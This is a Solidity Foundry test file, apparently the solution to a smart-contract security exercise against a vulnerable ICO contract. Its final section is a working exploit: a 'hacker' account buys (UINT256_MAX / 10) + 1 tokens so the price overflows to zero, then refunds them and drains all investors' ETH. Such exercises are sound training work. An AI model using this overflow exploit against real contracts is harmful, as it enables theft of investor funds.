// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";

interface IAIvestICO {
    function SALE_PERIOD() external view returns (uint256);
    function admin() external view returns (address);
    function adminMint(address _to, uint256 _amount) external;
    function adminWithdraw() external;
    function buy(uint256 numTokens) external payable;
    function changeAdmin(address _newAdmin) external;
    function refund(uint256 numTokens) external;
    function startTime() external view returns (uint256);
    function token() external view returns (address);
}

interface IAIvestToken {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function burn(address _to, uint256 _amount) external;
    function decimals() external view returns (uint8);
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
    function mint(address _to, uint256 _amount) external;
    function minter() external view returns (address);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract TestAO3 is Test {
    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address hacker = makeAddr("hacker");

    uint256 constant FIRST_INVESTOR_INVESTED = 520 ether;
    uint256 constant SECOND_INVESTOR_INVESTED = 126 ether;
    uint256 constant THIRD_INVESTOR_INVESTED = 54 ether;

    uint256 constant SECOND_INVESTOR_REFUNDED = 26 ether;

    uint256 TOTAL_INVESTED;

    IAIvestICO AIvestICO;
    IAIvestToken AIvestToken;

    function setUp() public {
        TOTAL_INVESTED =
            FIRST_INVESTOR_INVESTED + SECOND_INVESTOR_INVESTED + THIRD_INVESTOR_INVESTED - SECOND_INVESTOR_REFUNDED;

        vm.deal(user1, FIRST_INVESTOR_INVESTED);
        vm.deal(user2, SECOND_INVESTOR_INVESTED);
        vm.deal(user3, THIRD_INVESTOR_INVESTED);
        vm.deal(hacker, 1 ether);
    }

    function test_Hack() public {
        assertEq(hacker.balance, 1 ether);

        // Deploy contracts by deployer
        vm.startPrank(deployer);

        address _AIvestICOAddress = deployCode("AIvestICO.sol");
        AIvestICO = IAIvestICO(_AIvestICOAddress);

        address _token = AIvestICO.token();
        AIvestToken = IAIvestToken(_token);

        vm.stopPrank();

        console.log("Investments tests...");

        // Should Fail (no ETH)
        vm.prank(user1);
        vm.expectRevert("wrong ETH amount sent");
        AIvestICO.buy(FIRST_INVESTOR_INVESTED * 10);

        // Should Succeed
        vm.prank(user1);
        AIvestICO.buy{value: FIRST_INVESTOR_INVESTED}(FIRST_INVESTOR_INVESTED * 10);

        vm.prank(user2);
        AIvestICO.buy{value: SECOND_INVESTOR_INVESTED}(SECOND_INVESTOR_INVESTED * 10);

        vm.prank(user3);
        AIvestICO.buy{value: THIRD_INVESTOR_INVESTED}(THIRD_INVESTOR_INVESTED * 10);

        // Tokens and ETH balance checks
        assertEq(AIvestToken.balanceOf(user1), FIRST_INVESTOR_INVESTED * 10);
        assertEq(AIvestToken.balanceOf(user2), SECOND_INVESTOR_INVESTED * 10);
        assertEq(AIvestToken.balanceOf(user3), THIRD_INVESTOR_INVESTED * 10);
        assertEq(
            address(AIvestICO).balance, FIRST_INVESTOR_INVESTED + SECOND_INVESTOR_INVESTED + THIRD_INVESTOR_INVESTED
        );

        console.log("Refund tests...");

        // Should Fail (investor doesn't own so many tokens)
        vm.startPrank(user2);
        vm.expectRevert("ERC20: burn amount exceeds balance");
        AIvestICO.refund(SECOND_INVESTOR_INVESTED * 100);

        // Should succeed
        AIvestICO.refund(SECOND_INVESTOR_REFUNDED * 10);

        vm.stopPrank();

        // Tokens and ETH balance check
        assertEq(address(AIvestICO).balance, TOTAL_INVESTED);
        assertEq(AIvestToken.balanceOf(user2), (SECOND_INVESTOR_INVESTED - SECOND_INVESTOR_REFUNDED) * 10);

        console.log("Time to Exploit!!!");

        vm.startPrank(hacker);

        // we should find a number, (numTokens * 10) this equation should equal to 0
        // numTokens x 10 == MAXUINT
        // numTokens == (MAXUINT / 10)
        // this number becomes times 10 is MAXUINT therefore we need to add 1 to make it 0

        // hackNumber = 11579208923731619542357098500868790785326998466564056403945758400791312963994

        uint256 hackNumber = (UINT256_MAX / 10) + 1;

        console.log("hackNumber", hackNumber);

        AIvestICO.buy(hackNumber);

        AIvestICO.refund((TOTAL_INVESTED) * 10);

        assertEq(address(AIvestICO).balance, 0);
        assertEq(address(hacker).balance, TOTAL_INVESTED + 1 ether);
    }
}
